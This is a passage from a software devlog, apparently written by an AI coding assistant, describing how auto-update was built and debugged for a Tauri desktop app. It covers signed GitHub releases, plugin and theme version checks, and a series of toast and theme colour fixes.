originally"/"confirmed by a real test" framing - that history already lives here in devlog.md,
not in the code itself. Left several comments untouched where the agent's audit found the
historical framing was actually necessary context (e.g. `plugin_registry.rs`/
`plugin_verification.rs`'s module docs, most of `wasm_plugins.rs`'s Milestone 13 sandboxing
comments) - not everything referencing a past milestone number is narrative bloat, only where
the surrounding sentence was pure event narration with no bearing on how to safely edit the code
today. `bun run build`/`cargo check` both clean (comment-only changes, no behavior change).

## Milestone 20 — Auto-Update: App + Plugins/Themes (scoped, not started)

**Scoped from a design discussion, on user request.** User specified three concrete trigger
moments up front (app start, app focus, install-plugin modal open) before asking for
implementation approach - a good sign this had already been thought through as a real feature,
not a vague "add auto-update" ask. Framed the response around the fact that "auto-update" here
is actually two unrelated mechanisms that happen to share the same trigger moments, not one
feature:

- **The app updating itself** is a solved problem Tauri already ships an official answer for -
  `tauri-plugin-updater` (checks a hosted, signed `latest.json`, verifies via a minisign
  keypair, downloads, and `tauri-plugin-process` relaunches to apply). No reason to hand-roll
  this; the real work is wiring CI to actually publish a signed `latest.json` per release and
  generating/storing the signing keypair, not application logic.
- **Plugins/themes updating themselves** has no existing mechanism at all, custom or otherwise,
  and - checked before writing this up - a real structural gap blocks it entirely: the
  persisted `WasmPluginManifest`/`DataThemeManifest` records on disk (`plugin_installer.rs`)
  store `id`/`name`/`version`/etc. but never the manifest's *origin* (the URL it was installed
  from, or which curated-registry entry it came from). Without that, there's nothing to
  re-fetch and compare against later - this has to be added before any update-checking logic
  can exist at all, not an optional nice-to-have.

Scoped the milestone around this exact split: app self-update leans on Tauri's own plugin (CI
+ config work, not new application logic), plugin/theme self-update needs a real schema
addition first (persisting install origin) before the check/compare/apply pipeline can be
built at all. Both surfaces get checked at the same three moments via one orchestrating call,
since the user's own framing ("the moments which the app recognizes updates on both") already
implied unifying the trigger point even though the two mechanisms underneath stay separate.

**Built app self-update, on user's choice to start with this half first.** Recommended it
over plugin/theme self-update since it's mostly config/CI work reusing Tauri's own official
plugin, not new application logic with an unknown schema change blocking it.

- Added `tauri-plugin-updater = "2"`/`tauri-plugin-process = "2"` to `Cargo.toml`, registered
  both in `lib.rs` (`tauri_plugin_process::init()`, `tauri_plugin_updater::Builder::new().build()`),
  added `updater:default`/`process:allow-restart` to `capabilities/default.json`. `bun add
  @tauri-apps/plugin-updater @tauri-apps/plugin-process` for the JS side. `cargo check`/
  `bun run build` both clean after.
- **Signing keypair generated by the user themselves, not through this session** - same
  security discipline as the earlier GitHub PAT incident (never let a real secret's value
  flow through the conversation/logs). Added `updater-private.key`/`*.key` to a new
  `src-tauri/.gitignore` entry *before* the user ran `bunx tauri signer generate`, so the
  private key file could never land in git even by accident. Only the printed public key
  (safe to share) came back into this session, pasted into `tauri.conf.json`'s
  `plugins.updater.pubkey`, alongside `endpoints: ["https://github.com/smh0505/Concourse/
  releases/latest/download/latest.json"]`. Also had to open the app's CSP `connect-src` for
  `https://github.com`/`https://*.githubusercontent.com` (release asset downloads redirect
  through the latter), since the default CSP only allowed `ipc:`/`http://ipc.localhost`.
- **No release workflow existed at all for this repo before now** - Milestone 20's own
  write-up had assumed "extend the existing release workflow," which turned out to be wrong
  once actually checked. Wrote `.github/workflows/release.yml` from scratch using Tauri's
  official `tauri-apps/tauri-action` (builds, signs via the two `TAURI_SIGNING_PRIVATE_KEY*`
  secrets, and publishes a GitHub Release with `latest.json` attached, triggered by a `v*` tag
  push or manual dispatch). Asked the user whether to build for Windows/macOS/Linux (the
  standard `tauri-action` recipe) or Windows-only, given the app has Windows-specific
  dependencies throughout (registry access via `winreg`, WebView2, Locale Remulator/Emulator)
  with no evidence it's ever run on the other two - user chose Windows-only, so the workflow
  targets `windows-latest` alone rather than the usual 3-platform matrix. `releaseDraft: true`
  by default, since this is the very first release this repo has ever cut and shouldn't
  auto-publish without a look first. The two signing secrets still need to be set as GitHub
  Actions secrets by the user before this workflow can actually sign anything - not done yet,
  and deliberately not something to do through this session either.
- Frontend: new `stores/appUpdate.ts` (wraps `check()`/`downloadAndInstall()`/`relaunch()`,
  tracks a `dismissedVersion` so a "Later"-dismissed update doesn't immediately re-surface on
  the very next re-check) and `AppUpdateBanner.vue` (a persistent bottom-right banner, not the
  existing toast system - toasts auto-dismiss after 5s, which would hide an actionable
  "update available" prompt before the user could decide, so this needed its own UI rather
  than reusing `useToastStore`). Wired into all three trigger moments: `App.vue`'s `onMounted`
  (fire-and-forget, not awaited, so a slow/failed check doesn't delay the rest of startup) plus
  a new `getCurrentWindow().onFocusChanged` listener (registered/unregistered alongside the
  existing `library.dispose()` teardown), and `AddPlugin.vue`'s existing `watch(() =>
  props.open, ...)` - that component stays mounted the whole time `PluginSettings.vue` does
  (controlled via its own `:open` prop, not `v-if`), so `onMounted` alone would only fire once
  per settings-view visit, not once per actual modal open; the existing open-prop watcher
  (already there to reset the URL field) was the right place to add this instead.
- `bun run build`/`cargo check` both clean. Not runnable/testable in this environment (no
  Tauri window, no way to trigger a real update check against a real release) - this is
  written and typechecks correctly but genuinely unverified end-to-end; flagged honestly
  rather than claimed as working.

**Version bump, to actually enable testing the update path - user asked for the correct version
to be evaluated, not just a placeholder bump.** Checked every milestone heading in
`milestones.md`: Milestones 1-14 are the 1.0.0 baseline; Milestones 17, 18, and 19 have all
fully closed since, each a real Post-1.0 Roadmap milestone closure the versioning policy ties
a minor bump to - but the version string had stayed at `1.0.0` the entire time regardless,
never actually bumped as those closures happened. Milestone 14.5 doesn't count (explicitly
never closes, by its own definition); Milestone 20 is still in progress, not closed.
- Correct version: `1.0.0` → `1.3.0` (three missed minor bumps, one per closed Post-1.0
  milestone) → `1.3.1` (patch, for this session's in-progress Milestone 20 work, per "patch
  bumps for fixes within a milestone").
- Bumped `package.json`/`src-tauri/Cargo.toml`/`src-tauri/tauri.conf.json` together to
  `1.3.1`, verified all three match via `grep`. `bun run build`/`cargo check` both clean.
- This also matters functionally, not just for bookkeeping: `tauri-plugin-updater`'s `check()`
  compares the *running app's* embedded version (from `tauri.conf.json` at build time)
  against whatever a published `latest.json` claims - testing the update banner at all
  requires a real version difference between a locally-built "old" install and whatever gets
  published next, not just any arbitrary bump.

**End-to-end release test, on user's request to actually verify the pipeline rather than trust
it unread.** Built `1.3.1` locally first (`bunx tauri build`) as the "old" baseline install,
then iterated through real tagged test releases until the whole chain actually worked. Took
three failed attempts before succeeding - each one a real bug, not a retry-and-hope:

- **`v1.3.2`** (first real tag push): job succeeded, but no `.sig`/`latest.json` ever appeared -
  `tauri-action` logged `Signature not found for the updater JSON. Skipping upload...`. User's
  own hypothesis was a corrupt signing key/password (plausible, since `gh secret set
  --body-file` doesn't exist and the key had to be pasted manually into an interactive prompt
  as a workaround). Checked the actual build log line-by-line before accepting that
  explanation - the "Found artifacts:" list (what `tauri-action`'s own glob search actually
  located, as opposed to "Looking for artifacts in:", the candidate paths it merely expected)
  never contained any `.sig` file in either this run or a re-check of an even earlier
  `workflow_dispatch` test run. Ruled out corruption: nothing pointed at the key/password
  being the actual cause.
- **`v1.3.3`** (switched `bundle.targets` from `"all"` to `["nsis"]`, guessing the ambiguity
  between two Windows installer formats confused `tauri-action`'s artifact matching): same
  exact failure, ruling that theory out too.
- **Found the real cause via a targeted search of `tauri-apps/tauri-action`'s own issue
  history** (`gh search issues`/`gh issue view`, not guesswork) - issue #1098's comment thread
  states plainly: Tauri v2's bundler only ever writes `.sig` files at all when
  `bundle.createUpdaterArtifacts: true` is explicitly set in `tauri.conf.json`. Never set it.
  The signing secrets were correct the entire time; the bundler was never even trying to sign
  anything, regardless of what secrets were present.
- **`v1.3.4`** (added `createUpdaterArtifacts: true`): real progress - the build log now showed
  `Finished 1 updater signature at: ...exe.sig`, and `tauri-action`'s own artifact search
  correctly found both the installer and its signature this time. But the job then failed
  outright with `Resource not accessible by integration` while trying to create the GitHub
  release. Checked `gh api repos/.../actions/permissions/workflow` - the repo's default Actions
  permission was `read`, which caps the token even though `release.yml` itself declares
  `permissions: contents: write` at job level. Fixed via the same API call used earlier this
  session for `concourse-plugin-registry`'s bot-PR permission gap. Re-ran the *same* failed job
  (`gh run rerun --failed`) rather than re-tagging - hit the identical error again, because a
  rerun reuses the token context issued when the run was **originally** queued, before the
  permission fix; a genuinely new run was required, not a retry.
- **`v1.3.5`** (fresh tag, fresh token, everything above in place): succeeded completely -
  `Concourse_1.3.5_x64-setup.exe`, its `.sig`, and `latest.json` all uploaded. Downloaded
  `latest.json` directly (`gh release download --pattern latest.json --output -`) and read its
  actual content rather than trusting the upload succeeded: correct version (`1.3.5`), valid
  minisign signature blocks for both `windows-x86_64` and `windows-x86_64-nsis` platform keys,
  and a real (not placeholder) download URL. This is the first genuinely confirmed-working
  piece of the whole auto-update feature - everything before this was written-but-unverified.
- Cleaned up every failed intermediate test release/tag (`v1.3.2`, `v1.3.3`, `v1.3.4`) via `gh
  release delete --cleanup-tag`/`git push origin :refs/tags/<tag>` as each was superseded,
  rather than leaving broken draft releases cluttering the repo.
- Also added `Swatinem/rust-cache@v2` to `release.yml` mid-investigation, on the user's own
  observation that every run was taking ~15-20 minutes - the workflow had no Rust build
  caching at all, so every run recompiled heavy dependencies (`wasmtime`, `sigstore-*`, `sqlx`)
  completely from scratch every time. Didn't affect `v1.3.5`'s own run time (it was still
  populating the cache for the first time), but should meaningfully speed up whatever comes
  after it.
- **Still pending, deliberately left to the user**: publishing the `v1.3.5` draft release (only
  a published, non-draft release resolves via `/releases/latest`, which is what
  `tauri-plugin-updater`'s `check()` actually queries), and then the real GUI verification this
  session categorically cannot perform - launching the locally-built `1.3.1` install and
  confirming the update banner appears, downloads, installs, and relaunches correctly.

**Post-verification cleanup, on request:** bumped `actions/checkout` to `@v6` (was `@v4`), and
switched `releaseDraft: true` → `false` - now that the pipeline is confirmed working end to
end, future releases publish immediately instead of needing a manual un-draft step.

**Retested at `v1.3.6` (rebuilt the local `1.3.5` baseline from scratch, previous
`target/release` folder had been deleted) - user reported a real runtime bug this time,
`TypeError: Cannot read private member from an object whose class did not declare it`, caught
via a screenshot since Tauri's release build has no devtools access and the toast couldn't be
selected/copied (dragging to highlight text registered as a click and dismissed it).**

- Recognized this immediately as the same bug class already fixed once this session in
  `slotRegistry.ts` (`PluginSettings.vue`'s `shallowRef` vs `ref` fix for the "Vue received a
  Component that was made a reactive object" warning) - a real class instance backed by
  private fields gets deep-reactivized by a plain Pinia `ref()`, wrapping it in a Vue Proxy;
  calling any method on that Proxy later fails the private-field brand check, since private
  fields are tied to the exact original object identity, not whatever wraps it.
  `@tauri-apps/plugin-updater`'s `Update` class (extends `Resource`, wraps a real Tauri
  resource handle) is exactly this shape - `stores/appUpdate.ts` stored it in a plain `ref()`,
  and clicking "Update Now" called `.downloadAndInstall()` on the now-proxied instance.
- Fix: `available` changed from `ref<Update | null>` to `shallowRef<Update | null>` -
  `shallowRef` only makes the ref's own reassignment reactive, never wraps the assigned value
  itself, so the real `Update` instance (and its private fields) stays intact when its methods
  are called later. `checking`/`installing` stayed plain `ref<boolean>` - primitives have no
  reactivity/proxy concern at all.
- `bun run build`/`cargo check` both clean.
- Also confirmed `rust-cache`'s actual behavior on `v1.3.6`'s run: it restored nothing ("No
  cache found"), total run time barely moved (~16.4min vs ~17-18min before). First guess
  (`Cargo.lock`'s hash changing because this crate's own `version` field bumps every test) was
  wrong - checked directly and the computed cache/restore keys were byte-identical across the
  `v1.3.5`/`v1.3.6`/`v1.3.7` runs (`v0-rust-release-Windows_NT-x64-8af1e26a-37380225`), so key
  content was never the issue. User asked to confirm precisely rather than accept the first
  guess; `gh api repos/.../actions/caches` showed the real answer: two separate cache entries
  existed, same key, but scoped to different refs (`refs/heads/refs/tags/v1.3.5` and
  `refs/heads/refs/tags/v1.3.6`). GitHub Actions caches are scoped per-ref, falling back only
  to the repo's default branch - two different tags have no fallback relationship to each
  other at all, so each of this milestone's test releases (a new tag every time) gets its own
  isolated cache no matter how identical the key is. Not a misconfiguration; in real usage the
  cache would only ever pay off across commits sharing a ref (e.g. regular pushes to `main`),
  never across one-off release tags the way this session's rapid-fire testing used it.

**Final confirmation, from the user actually running it.** Rebuilt a local test install at
version `1.3.6` from current (fixed) source - deliberately *not* committing/pushing the
temporary version edit, since this was purely a local one-off build (`git checkout --
package.json src-tauri/Cargo.toml src-tauri/tauri.conf.json` restored the working tree to the
real committed `1.3.7` immediately after). This mattered because the `TypeError` lives in
whatever code is *currently installed and initiating the update check* (the old `1.3.5`
baseline was built from pre-fix source, so it would have hit the bug regardless of how many
fixed releases got published afterward) - needed a baseline built from the fix itself, at a
lower version than the target release, to actually test the fix rather than just re-trigger
the same old bug. Installed that `1.3.6` build, updated to the published `v1.3.7` release:
download, install, and relaunch all completed successfully, no `TypeError`. App self-update is
now fully verified working end to end, not just typechecked/built. Plugin/theme self-update
(Milestone 20's other half) remains unstarted.

**Started plugin/theme self-update with the schema change it's blocked on.** Added two fields
to both `WasmPluginManifest`/`DataThemeManifest` (`plugin_installer.rs`): `source_url` (the
exact manifest URL this was installed from) and `installed_via_registry` (bool). The latter
matters because a registry-curated install's `source_url` is a commit-SHA'd raw GitHub URL,
frozen forever by design (that's the whole point of pinning a hash to a specific reviewed
commit) - re-fetching that exact URL later would never show a newer version even once one
exists, so an update-check for a registry-installed plugin needs a completely different
strategy (re-fetch the registry's *current* entry for this plugin's `id`) than a freeform
direct-URL install (just re-fetch `source_url` itself and compare `version`). Didn't add a
separate parameter to derive this flag - `install_plugin`'s existing `expected_sha256:
Option<String>` is already exactly this signal (`AddPlugin.vue` only ever passes a hash
alongside a registry entry, never for a freeform pasted URL), so `expected_sha256.is_some()`
is the flag.
- `install_wasm_plugin` previously wrote the original downloaded `manifest_bytes` straight to
  `plugin.json` verbatim; changed to serialize the (now-mutated) `manifest` struct instead so
  the injected fields actually persist. Confirmed nothing downstream depends on the file's
  exact original byte content - Milestone 14's signing check hashes the `.wasm` binary, not
  `plugin.json`, so re-serializing is safe. `install_data_theme` already serialized the struct
  (not raw bytes), so only needed the two field assignments added, no structural change.
- **Assessed whether this breaks anything, since it touches a persisted on-disk format the
  user specifically asked about.** Both new fields are `#[serde(default)]`/`Option` - an
  already-installed manifest from before this change (missing both fields entirely) still
  deserializes without error, just showing `None`/`false` until the user reinstalls; an
  upstream plugin/theme author's own manifest.json (which never declares these fields at all,
  since they're host-added metadata, not something an author writes) also parses fine.
  Concluded this is **not a breaking change** - noted explicitly in the commit message as
  asked, rather than leaving it ambiguous.
- Mirrored the two new fields onto the frontend's `PluginManifest` TS type
  (`src/plugins/manifest.ts`) as `sourceUrl`/`installedViaRegistry` - `loader.ts`'s
  `invoke<PluginManifest[]>("list_wasm_plugins"/"list_data_themes")` calls already spread the
  Rust-returned object through untyped, so the values would have flowed through either way;
  this just gives them a declared type for whatever later step actually reads them (the
  update-check UI, not yet built).
- Extended the existing real-HTTP-server round-trip test (`installs_lists_and_uninstalls_a_
  real_theme`) with assertions that `source_url`/`installed_via_registry` actually survive the
  install → list round-trip, not just compile. Added a new test
  (`marks_a_correctly_pinned_theme_as_installed_via_registry`) for the one path no existing
  test exercised at all - a *successful* pinned-hash install (only the mismatch-rejection case
  was covered before) - computing the real correct hash of served bytes rather than hardcoding
  one, so the test proves the actual hash-matching logic, not just that the flag gets set
  given some hash. All 5 `plugin_installer` tests pass; `cargo check`/`bun run build` both
  clean.

**Added `check_plugin_update`, the Rust command that actually uses the new schema.** Two
lookup strategies chosen by `installed_via_registry` (already covered in the schema entry
above):
- Registry install: re-fetch the whole registry via the existing `plugin_registry::
  fetch_plugin_registry()` (no new registry-fetching code needed), find the entry matching
  this plugin's `id`, use *its* `manifest_url` - which may have moved to a newer pinned commit
  since install, unlike the old `source_url` which is frozen forever by design.
- Direct-URL install: re-fetch `source_url` itself.
- Either way, once a manifest URL is resolved, downloads it and parses only a `VersionProbe`
  (`{ version: String }`) rather than the full `WasmPluginManifest`/`DataThemeManifest` shape -
  both manifest kinds use the identically-named `version` field, so there's no need to know
  which shape it is just to compare versions.
- No known origin at all (registry entry removed/revoked since install, or a pre-Milestone-20
  install with no `source_url` ever recorded) reports "no update" rather than erroring the
  whole check - there's genuinely nothing left to check against, and a hard error here would
  be a worse experience than just silently not offering an update for that one plugin.

**Added real version comparison, not string equality.** `version_is_newer` splits both version
strings on `.` and compares each segment numerically (`"1.10.0" > "1.9.0"`) rather than
lexically (where the same comparison goes backwards - `"1.10.0" < "1.9.0"` as plain strings,
since `'1' < '9'` character-by-character). Falls back to plain inequality if either side isn't
all-numeric segments (e.g. a pre-release suffix), rather than pulling in a real SemVer crate
for one comparison this app's actual manifests never need more than plain `x.y.z` for.

**Caught and fixed my own mistake mid-edit.** The `Edit` tool call that inserted this new code
accidentally deleted the `uninstall_data_theme` command function itself in the process (the
`old_string`/`new_string` boundary swallowed it) - caught immediately by `cargo check` failing
with `cannot find __tauri_command_name_uninstall_data_theme`, not by manual inspection. Fixed
by re-adding the function; re-ran `cargo check` clean before moving on, rather than assuming
the fix was correct from reading the diff alone.

**Tests**: added 4 new ones alongside the 5 already there (9 total, all passing) -
`version_is_newer_compares_numerically_not_lexically` (the actual bug numeric comparison
exists to prevent, proven directly), plus three real end-to-end `check_plugin_update` tests
against a real self-hosted HTTP server (same discipline as every other test in this file):
detects a genuinely newer version, correctly reports no update when already current, and
correctly reports no update when there's no known origin to check at all - rather than only
testing the "happy path where an update exists" case. `cargo check`/`cargo test`/
`bun run build` all clean.

**Frontend "update available" indicator, wired into `PluginSettings.vue`.** New
`stores/pluginUpdates.ts` - a thin Pinia wrapper around `check_plugin_update` keyed by plugin
id, with `checkOne`/`checkAll`/`isUpdateAvailable`. `checkOne` no-ops for any manifest whose
`runtime` isn't `"wasm"`/`"data"` - a build-time TS plugin was never installed through the
pipeline that records `sourceUrl`/`installedViaRegistry` at all, so checking one would be a
wasted round-trip against a command that can only ever report "no known origin" for it.
- Added an `<span v-if="pluginUpdates.isUpdateAvailable(manifest.id)" class="update-badge">`
  next to the existing `<span class="version">` in all 5 of `PluginSettings.vue`'s tabs
  (source/theme/metadata/controller/wrapper) - all 5 were byte-identical, so used `replace_all`
  the same way the earlier `.active`→`accent-active` migration did. Controller mappings are
  always build-time TS today (no WASM support exists for that kind), so the badge will simply
  never show there in practice - left the markup in anyway rather than special-casing it out,
  since `isUpdateAvailable` already returns `false` safely for anything never checked.
- Triggered via a single `pluginUpdates.checkAll([...five stores' manifests])` call in
  `PluginSettings.vue`'s existing `onMounted` - explicitly a baseline for now, not the real
  three-moment wiring the app self-update already has (that's the next, separate checklist
  item). Passing every kind's manifests here (including controller's, which can never actually
  have an origin to check) is harmless given `checkOne`'s no-op guard.
- Verified via compiled CSS: `.update-badge` present exactly once, `--color-accent` colored,
  matching count of markup usages (5 template sites + 1 style rule = 6 total occurrences of
  the string, confirmed via `grep -c`). `bun run build` (typecheck + build) and `cargo check`
  both clean.

**Apply-update path.** Added `latest_sha256` to the Rust `UpdateCheckResult` first - a
registry-sourced update needs to carry its *new* pinned hash forward so applying it keeps the
same hard-reject-on-mismatch integrity check a fresh registry install already gets, rather than
silently downgrading to an unpinned install just because it's an update. Only set when
`update_available` is true (no point carrying a hash for a version that's already current).
- `pluginUpdates.ts`'s new `applyUpdate(manifest)` calls the exact same `install_plugin`
  command `pluginInstall.ts`'s `confirmInstall` already uses - installing over an existing id
  is just an overwrite (`plugin_installer.rs`'s `replace_dir` already handles this correctly,
  nothing new needed there). Deliberately skips the confirm-install dialog a brand-new install
  goes through - this id is already installed and implicitly trusted, an update is refreshing
  it, not vetting something unknown.
- **Found and fixed a real pre-existing gap while wiring the refresh step**: every other
  domain store (`plugins.ts`, `theme.ts`, `metadataProviders.ts`) has a `refreshManifests()`
  used after an install/reinstall, but `wrapperPlugins.ts` never did - it only ever set
  `manifests` once, in `init()`. Not something this milestone created, just never noticed
  before since nothing previously needed to refresh a wrapper plugin's manifest after the
  fact. Added it, mirroring the other three stores' identical one-line implementation.
  Toggling a wrapper's enabled state already had its own separate `reloadPlugins()` path
  (unaffected by this addition).
- Turned the plain `<span>` badge into a real `<button class="update-badge compact-button">`
  (reusing the existing shared `.compact-button` sizing, layering accent colors on top so it
  reads as a call-to-action rather than another neutral button) showing the actual target
  version ("Update to v1.2.0") rather than a generic "Update available" label, now that
  clicking it does something. Verified it's safe to nest a `<button>` inside the row's
  existing `<label>` (wrapping the enable/select checkbox or radio) - browsers don't forward a
  label's click-activation to its associated control when the click target is itself another
  interactive element (button/input/select/etc.), so clicking "Update" doesn't also
  accidentally toggle the plugin's enabled state.
- `cargo check`/`cargo test` (all 9 `plugin_installer` tests, no new ones added for this step -
  no new Rust logic beyond the one added struct field, already covered by existing
  `check_plugin_update` tests) and `bun run build` all clean. Verified via compiled CSS:
  `.update-badge` present exactly once with the expected accent-color properties.

**Wired plugin/theme update-checking into the same three trigger moments as app self-update,
closing the milestone.** Extracted a small `checkAllPluginUpdates()` helper in `App.vue`
(gathers all five domain stores' manifests, calls `pluginUpdates.checkAll`) and called it
alongside `appUpdate.checkForUpdate()` at both existing spots - the `onMounted` block (after
all five stores' own `init()` calls, so their manifests are actually populated by the time this
runs) and the `onFocusChanged` listener. `AddPlugin.vue`'s existing `open`-prop watcher (the
third moment, already home to `appUpdate.checkForUpdate()`) got the same five-store gather
inlined directly, since that component doesn't share `App.vue`'s local helper scope.
- Deliberately did **not** remove `PluginSettings.vue`'s own mount-time `checkAll` call, which
  predates this step - reconsidered whether it was now-redundant scaffolding to clean up, and
  concluded it isn't: opening the Settings view is a real, distinct user action from all three
  canonical moments (someone can navigate to Settings without the app having just started,
  regained focus, or had the install-plugin modal opened), so keeping it as a fourth check
  point is a genuine UX improvement, not leftover clutter. Updated its comment to describe
  itself accurately instead of the now-stale "baseline for now, proper wiring is later" framing.
- `bun run build` (typecheck + build) and `cargo check` both clean.

**Milestone 20 fully closed.** App self-update is verified working end to end (a real published
release, a real GUI test, a real bug found and fixed along the way). Plugin/theme self-update
is fully built and wired into four check moments - the schema change, the check command, the
apply path, and the UI are all in place and pass their own tests - but unlike the app half,
it was never GUI-tested end to end in this session: doing so would need an actually-installed
WASM plugin or data theme with a real newer version published somewhere to check against,
which wasn't set up here. Worth a real test pass before fully trusting it, the same way the app
half needed three failed release attempts before its own real bugs (`createUpdaterArtifacts`,
the workflow-permission gap, the `shallowRef` fix) surfaced.

**Post-close polish: replaced the standalone update banner with an actionable toast, on user
request.** `AppUpdateBanner.vue` and `ToastContainer.vue` both used identical `position: fixed;
bottom; right; z-index: 200` placement - equal z-index means DOM order decides visual
stacking, and the banner rendered after the toast container in `App.vue`, so it silently sat on
top of and hid any toasts underneath it. Rather than just nudging one's position, folded the
whole notification into the toast system itself as a new toast *shape* - an actionable toast
with buttons - since a banner and a toast were never really two different concepts here, just
two competing UI surfaces for the same kind of message.
- `stores/toasts.ts`: new optional `Toast.actions?: ToastAction[]` (`{ label, onClick }`) and a
  `pushAction(message, actions, type?)` alongside the existing `push()` - actionable toasts
  never auto-dismiss (the whole point of offering a real choice, not losing it to the existing
  5s timer), returning the new toast's id so a caller can dismiss it itself once an action is
  taken.
- `ToastContainer.vue`: renders `toast.actions` as buttons (reusing the shared `.compact-button`
  sizing) when present; the toast body's own click-to-dismiss only fires when there are no
  actions (`@click="!toast.actions && toasts.dismiss(...)"`), and each action button stops
  propagation on its own click so clicking "Update Now" doesn't also immediately dismiss the
  toast via the parent handler.
- **Simplified `stores/appUpdate.ts` at the same time, closing the earlier `shallowRef` fix's
  root cause structurally rather than just working around it.** The `Update` class instance is
  now captured directly in a plain closure (`onClick: () => applyUpdate(update)`), never stored
  in a Vue `ref`/`reactive` at all - a closure variable is never Proxy-wrapped by Vue's
  reactivity, so there's no private-field brand-check failure possible in the first place, not
  just one avoided via `shallowRef`. Dropped the `available`/`installing` state entirely (only
  ever read by the now-deleted `AppUpdateBanner.vue`) - `checkForUpdate()` now pushes an
  action-toast directly via `offerUpdate()`, tracking just the active toast's id (to avoid
  stacking a duplicate offer if a re-check fires while one's still open) and the
  last-dismissed version (unchanged behavior from before).
- Deleted `AppUpdateBanner.vue` entirely and its usage in `App.vue` - confirmed via `grep` that
  nothing else referenced `appUpdate.available`/`.installing` before removing them from the
  store.
- Verified via compiled CSS: `.toast`/`.toast-actions` both compile with the expected flex
  layout. `bun run build` (typecheck + build) and `cargo check` both clean. Not visually
  re-verified in a running app - same limitation as every other UI change this session, no
  browser/screenshot tooling available in this environment.

**Added a "UI Test" sidebar tab, replacing the earlier throwaway test button.** New
`AppView` value (`NavSidebar.vue`), new `UiTest.vue` component, wired into `App.vue`'s
existing view-switch (`v-else-if`/`v-else` chain, now three branches instead of two). Moved
the manual actionable-toast trigger here from its temporary spot in `AppSettings.vue`, and
added four more: plain info/success/error toasts, plus a long-message one (to check text
wrapping/sizing at a size the short test messages never exercised). All five are just manual
UI-state triggers, not real functionality - explicitly labeled as such in the tab's own
description text.

**Fixed a real contrast bug in `.toast-info`, found via the Brick Block data theme.** User
noticed info toasts were hard to read specifically under Brick Block - traced it to
`.toast-info`'s `background: var(--color-surface1); color: var(--color-text)` pairing:
Brick Block's `--color-surface1` (`#7c2c00`, a dark saturated brown - the same value used for
button borders) paired with `--color-text` (`#1a1a2e`, dark navy) gives poor contrast, since
`--color-text` assumes a light neutral background that `--color-surface1` isn't guaranteed to
be. This is the exact same problem class already solved for buttons - `--color-button-text`
exists specifically because "a theme with saturated/dark button backgrounds... can override
just this one, without also recoloring body text" (its own doc comment in `styles.css`), and
Brick Block already overrides it to white for that reason. Reused `--color-button-text` for
`.toast-info` instead of `--color-text` - the default Catppuccin theme is unaffected (that
token defaults to `var(--color-text)` there), only themes that override it (like Brick Block)
get the improved contrast. Verified via compiled CSS. `bun run build`/`cargo check` both
clean.

**Two more toast fixes, both found via Brick Block again.** (1) `.toast-success` and
`.toast-error` were both red under Brick Block - `--color-accent` (`#e52521`) and
`--color-danger` (`#b71c1c`) are both red-family hues in that theme's palette, hard to tell
apart at a glance. Switched `.toast-success` to `--color-accent-alt` instead of
`--color-accent` - a theme's two brand colors are already meant to be visually distinct from
each other by construction (that's the whole reason a theme declares two of them), unlike
`--color-accent` vs `--color-danger`, which nothing guarantees are different hues. Happens to
also line up with the near-universal "green means success" convention for Brick Block
specifically (`--color-accent-alt: #43b047`, a real green) and stays a real, distinct color for
the default Catppuccin theme too (purple vs. red), even though it's not literally "green"
there. (2) Right-aligned `.toast-actions`' buttons (`justify-content: flex-end`) rather than
left-flush, per direct request - didn't extend this to the update-offer toast specifically
since the change is at the shared `.toast-actions` level, so it applies to every actionable
toast uniformly, not just that one.
- Verified via compiled CSS: `.toast-success{background:var(--color-accent-alt)}`,
  `.toast-actions{...justify-content:flex-end...}`. `bun run build`/`cargo check` both clean.

**Follow-up 1: `--color-accent-alt` reuse was wrong, tried a dedicated token.** User caught
that switching `.toast-success` to `--color-accent-alt` recolors the default Catppuccin Latte
theme's success toast from its old blue-ish accent to purple (`--color-accent-alt: #8839ef`
there) - an unintended side effect of a Brick Block-specific fix. Confirmed via
`grep -rln "color-accent-alt" src` that `.toast-success` was the only real *consumer* of the
token (the other hits - `styles.css`'s own `:root` default plus the four
`catppuccin-*/index.ts` files - only *declare* its per-theme value, they don't use it for
anything else's appearance). No `--color-success` token had ever existed prior to this - the
user's question named one, but the actual prior change was `--color-accent` -> `--color-accent-
alt`, not from any `--color-success`.

First fix attempt: added a new dedicated `--color-success` token to `styles.css`'s `:root`
(`#40a02b`, Catppuccin Latte's "Green"), pointed `.toast-success` at it, gave Brick Block its
own `--color-success: var(--color-accent-alt)` override in the sibling `data-theme-plugins`
repo (version `1.3.1` -> `1.3.2`).

**Follow-up 2: reverted the token, fixed Brick Block's palette instead.** User tested and
reported every theme's success toast looked identical (all green) - because no theme other
than Brick Block ever gave `--color-success` a distinct value; the token added a layer with
no real per-theme variation, all cost no benefit. Reverted `styles.css`/`ToastContainer.vue`
back to `.toast-success { background: var(--color-accent); }`, removed the `--color-success`
declaration entirely. Root problem was always Brick Block's own palette, not the shared
component: `--color-accent` (`#e52521`, red) and `--color-danger` (`#b71c1c`, dark red) are
too close, and `--color-accent` is also used everywhere else (buttons, active tabs, tile
focus ring), so recoloring the toast rule alone wouldn't have fixed those other surfaces
either. Fixed at the source: Brick Block's `manifest.json` `--color-accent` changed from
`#e52521` to `#0058f8` (a Mario pipe-blue, distinct from `--color-accent-alt`'s green and
`--color-danger`'s dark red), version bumped `1.3.2` -> `1.3.3`. This recolors every
`--color-accent`-driven surface in Brick Block, not just toasts - buttons, active nav/tabs,
tile focus ring all shift from red to blue too, which is the intended, theme-wide effect this
time, not a scoped side effect to work around.

Copied the updated manifest into the app's local theme cache (`%APPDATA%/com.bloppy.concourse/
data-themes/brick-block-data-theme/theme.json`) for live testing each time, same pattern as
earlier in the session. `bun run build` clean at every step.

**Follow-up 3: the active-tab recolor turned out unwanted too, given its own opt-in hook.**
The blue `--color-accent` bumped in follow-up 2 also recolored `.accent-active` (the shared
"selected" indicator class - active nav item, tag filter, and every Settings tab, defined once
in `styles.css`, reused across `NavSidebar.vue`/`GameFilters.vue`/`PluginSettings.vue`). Unlike
buttons/tile-focus-ring (fine staying blue), user wanted the selected-tab highlight to *not*
follow the accent color change, without reverting `--color-accent` itself or hardcoding an
exception into the shared class. Gave `.accent-active` its own opt-in hooks instead -
`background: var(--accent-active-background, var(--color-accent))` /
`color: var(--accent-active-color, var(--color-on-accent))` - same fallback-hook pattern
already used for `--button-border-color`/`--tile-*`/`--card-*`. Every theme that doesn't
declare these two new variables is byte-for-byte unaffected (falls through to
`--color-accent` exactly as before). Brick Block's `manifest.json` sets
`--accent-active-background: #fce303` (its existing cover-placeholder star yellow) /
